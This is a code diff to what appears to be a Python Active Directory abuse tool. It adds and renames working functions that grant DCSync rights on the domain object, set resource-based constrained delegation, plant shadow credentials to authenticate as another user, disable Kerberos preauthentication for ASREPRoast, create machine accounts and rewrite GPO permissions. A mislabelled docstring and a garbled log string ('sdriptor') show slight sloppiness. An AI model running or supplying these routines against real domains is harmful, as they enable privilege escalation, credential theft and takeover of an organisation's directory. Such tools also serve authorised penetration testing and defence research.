@@ -59,6 +59,21 @@ def getObjectAttributes(conn, identity):
 
 
 @register_module
+def getObjectSID(conn, identity):
+    """
+    Get the SID for the given identity
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the object
+    """
+    ldap_conn = conn.getLdapConnection()
+    object_dn = resolvDN(ldap_conn, identity)
+    ldap_conn.search(object_dn, '(objectClass=*)', attributes=['objectSid'])
+    object_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
+    LOG.info(format_sid(object_sid))
+    return object_sid
+
+
+@register_module
 def addUser(conn, sAMAccountName, password, ou=None):
     """
     Add a new user in the LDAP database
@@ -86,6 +101,48 @@ def addUser(conn, sAMAccountName, password, ou=None):
     else:
         LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
         raise BloodyError(ldap_conn.result['description'])
+
+
+@register_module
+def addComputer(conn, hostname, password, ou=None):
+    """
+    Add a new computer in the LDAP database
+    By default the computer object is put in the OU CN=Computers
+    This can be changed with the ou parameter
+    Args:
+        hostname: computer name (without the trailing $ symbol)
+        password: the password that will be set for the computer account
+        ou: Optional parameters - Where to put the computer object in the LDAP directory
+    """
+    ldap_conn = conn.getLdapConnection()
+
+    sAMAccountName = hostname + '$'
+    domain = conn.conf.domain
+
+    if ou:
+        computer_dn = f'cn={sAMAccountName},{ou}'
+    else:
+        naming_context = getDefaultNamingContext(ldap_conn)
+        computer_dn = f'cn={sAMAccountName},cn=Computers,{naming_context}'
+
+    computer_cls = ['top', 'person', 'organizationalPerson', 'user', 'computer']
+    computer_spns = [f'HOST/{hostname}',
+                     f'HOST/{hostname}.{domain}',
+                     f'RestrictedKrbHost/{hostname}',
+                     f'RestrictedKrbHost/{hostname}.{domain}',
+                     ]
+    attr = {'objectClass': computer_cls,
+            'distinguishedName': computer_dn,
+            'sAMAccountName': sAMAccountName,
+            'userAccountControl': 0x1000,
+            'dnsHostName': f'{hostname}.{domain}',
+            'servicePrincipalName': computer_spns,
+            }
+
+    ldap_conn.add(computer_dn, attributes=attr)
+    LOG.info(ldap_conn.result)
+
+    changePassword(conn, sAMAccountName, password)
 
 
 @register_module
@@ -203,21 +260,58 @@ def addDomainSync(conn, identity):
 
     # print_m('Querying domain security descriptor')
     ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)
+    
+    entry_dn = ldap_conn.entries[0].entry_dn
+    sd_data = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
 
-    secDescData = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
-
-    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
 
     # We need "control access" here for the extended attribute
     accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
 
     # these are the GUIDs of the get-changes and get-changes-all extended attributes
-    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
-    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
+    sd['Dacl'].aces.append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
+    sd['Dacl'].aces.append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
 
-    dn = entry.entry_dn
-    data = secDesc.getData()
-    ldap_conn.modify(dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    data = sd.getData()
+    ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+
+@register_module
+def delDomainSync(conn, identity):
+    """
+    Give the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the user
+    """
+    ldap_conn = conn.getLdapConnection()
+
+    user_sid = getObjectSID(conn, identity)
+
+    # Set SD flags to only query for DACL
+    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
+
+    # print_m('Querying domain security descriptor')
+    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)
+    
+    entry_dn = ldap_conn.entries[0].entry_dn
+    sd_data = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
+
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
+
+    aces_to_keep = []
+    LOG.debug('Currently allowed sids for domain sync:')
+    for ace in sd['Dacl'].aces:
+        ace_sid = ace['Ace']['Sid']
+        if ace_sid.getData() == user_sid:
+            LOG.debug('    %s (will be removed)' % ace_sid.formatCanonical())
+        else:
+            LOG.debug('    %s' % ace_sid.formatCanonical())
+            aces_to_keep.append(ace)
+
+    sd['Dacl'].aces = aces_to_keep
+    attr_values = [sd.getData()]
+
+    ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, attr_values)}, controls=controls)
 
 
 @register_module
@@ -255,49 +349,7 @@ def changePassword(conn, identity, new_pass):
 
 
 @register_module
-def addComputer(conn, hostname, password, ou=None):
-    """
-    Add a new computer in the LDAP database
-    By default the computer object is put in the OU CN=Computers
-    This can be changed with the ou parameter
-    Args:
-        hostname: computer name (without the trailing $ symbol)
-        password: the password that will be set for the computer account
-        ou: Optional parameters - Where to put the computer object in the LDAP directory
-    """
-    ldap_conn = conn.getLdapConnection()
-
-    sAMAccountName = hostname + '$'
-    domain = conn.conf.domain
-
-    if ou:
-        computer_dn = f'cn={sAMAccountName},{ou}'
-    else:
-        naming_context = getDefaultNamingContext(ldap_conn)
-        computer_dn = f'cn={sAMAccountName},cn=Computers,{naming_context}'
-
-    computer_cls = ['top', 'person', 'organizationalPerson', 'user', 'computer']
-    computer_spns = [f'HOST/{hostname}',
-                     f'HOST/{hostname}.{domain}',
-                     f'RestrictedKrbHost/{hostname}',
-                     f'RestrictedKrbHost/{hostname}.{domain}',
-                     ]
-    attr = {'objectClass': computer_cls,
-            'distinguishedName': computer_dn,
-            'sAMAccountName': sAMAccountName,
-            'userAccountControl': 0x1000,
-            'dnsHostName': f'{hostname}.{domain}',
-            'servicePrincipalName': computer_spns,
-            }
-
-    ldap_conn.add(computer_dn, attributes=attr)
-    LOG.info(ldap_conn.result)
-
-    changePassword(conn, sAMAccountName, password)
-
-
-@register_module
-def setRbcd(conn, spn_id, target_id):
+def addRbcd(conn, spn_id, target_id):
     """
     Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
     Args:
@@ -306,7 +358,7 @@ def setRbcd(conn, spn_id, target_id):
     """
     ldap_conn = conn.getLdapConnection()
     target_dn = resolvDN(ldap_conn, target_id)
-    spn_sid = getObjectSID(conn, spn_sid)
+    spn_sid = getObjectSID(conn, spn_id)
 
     ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
     rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
@@ -338,7 +390,7 @@ def delRbcd(conn, spn_id, target_id):
     """
     ldap_conn = conn.getLdapConnection()
     target_dn = resolvDN(ldap_conn, target_id)
-    spn_sid = getObjectSID(conn, spn_sid)
+    spn_sid = getObjectSID(conn, spn_id)
 
     ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
     rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
@@ -373,7 +425,7 @@ def delRbcd(conn, spn_id, target_id):
         raise ResultError(ldap_conn.result)
 
 @register_module
-def setShadowCredentials(conn, identity, outfilePath=None):
+def addShadowCredentials(conn, identity, outfilePath=None):
     """
     Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
     Args:
@@ -434,7 +486,7 @@ def delShadowCredentials(conn, identity):
 
 
 @register_module
-def dontReqPreauth(conn, identity, enable):
+def setDontReqPreauthFlag(conn, identity, enable):
     """
     Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
     You must have a write permission on the UserAccountControl attribute of the target user
@@ -464,21 +516,6 @@ def setAccountDisableFlag(conn, identity, enable):
 
 
 @register_module
-def getObjectSID(conn, identity):
-    """
-    Get the SID for the given identity
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the object
-    """
-    ldap_conn = conn.getLdapConnection()
-    object_dn = resolvDN(ldap_conn, identity)
-    ldap_conn.search(object_dn, '(objectClass=*)', attributes=['objectSid'])
-    object_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
-    LOG.info(format_sid(object_sid))
-    return object_sid
-
-
-@register_module
 def modifyGpoACL(conn, identity, gpo):
     """
     Give permission to a user to modify the GPO
@@ -498,14 +535,12 @@ def modifyGpoACL(conn, identity, gpo):
         raise NoResultError(getDefaultNamingContext(ldap_conn), ldap_filter)
     gpo = ldap_conn.entries[0]
 
-    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
-    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-    newace = createACE(user_sid)
-    secDesc['Dacl']['Data'].append(newace)
-    data = secDesc.getData()
+    sd_data = gpo['nTSecurityDescriptor'].raw_values[0]
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
+    sd['Dacl'].aces.append(createACE(user_sid))
 
-    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [sd.getData()])}, controls=controls)
     if ldap_conn.result["result"] == 0:
-        LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
+        LOG.info('LDAP server claims to have taken the sdriptor. Have fun')
     else:
         raise ResultError(ldap_conn.result)
